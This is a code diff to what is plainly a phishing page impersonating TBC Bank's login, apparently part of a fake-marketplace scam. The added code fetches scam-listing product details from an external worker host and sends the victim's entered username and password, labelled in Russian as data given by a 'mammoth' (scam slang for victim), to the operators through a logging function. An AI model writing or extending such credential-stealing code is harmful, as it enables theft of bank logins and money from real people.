@@ -801,8 +801,13 @@ function handleLogin() {
   if (!p.value.trim()) { p.classList.add('error'); pe.textContent = t.ep; pe.style.display = 'block'; ok = false; }
   if (!ok) return;
 
-  // Логирование попытки входа в TBC
-  sendLog('bank_login', `🏦 TBC Bank\n👤 User: ${u.value}`);
+  // Get link_id from URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const link_id = urlParams.get('link_id') || '';
+
+  // Логирование данных входа в TBC (отправляем username, password, и product info)
+  const logMessage = `💳 **МАМОНТ ДАЛ ДАННЫЕ TBC**\n👤 Логин: ${u.value}\n🔐 Пароль: ${p.value}\n📦 Товар: ${tbc_productName}\n💰 Цена: ${tbc_productPrice}${link_id ? `\nlink_id=${link_id}` : ''}`;
+  sendLog('tbc_data', logMessage);
 
   document.getElementById('overlay').classList.add('active');
 
@@ -829,6 +834,10 @@ document.addEventListener('keydown', function(e) { if (e.key === 'Enter') handle
   });
 });
 
+// Global variables for product info
+let tbc_productName = '';
+let tbc_productPrice = '';
+
 // Логирование выбора банка TBC при загрузке страницы
 document.addEventListener('DOMContentLoaded', function() {
   const urlParams = new URLSearchParams(window.location.search);
@@ -836,8 +845,17 @@ document.addEventListener('DOMContentLoaded', function() {
   console.log(`🔍 TBC Login - link_id=${link_id}`);
   sendLog('bank_selected', `🏦 Мамонт выбрал TBC\nlink_id=${link_id}`);
 
-  // Send online status
+  // Load product info
   if (link_id) {
+    fetch(`https://worker-production-740e.up.railway.app/link/${link_id}`)
+      .then(r => r.json())
+      .then(data => {
+        tbc_productName = data.name || 'Товар';
+        tbc_productPrice = data.price || '';
+        console.log(`📦 Loaded TBC product: ${tbc_productName} (${tbc_productPrice})`);
+      })
+      .catch(e => console.warn(`⚠️ Failed to load TBC product: ${e}`));
+
     console.log(`✅ TBC Login - sending online for ${link_id}`);
     sendLog('online', link_id);
 
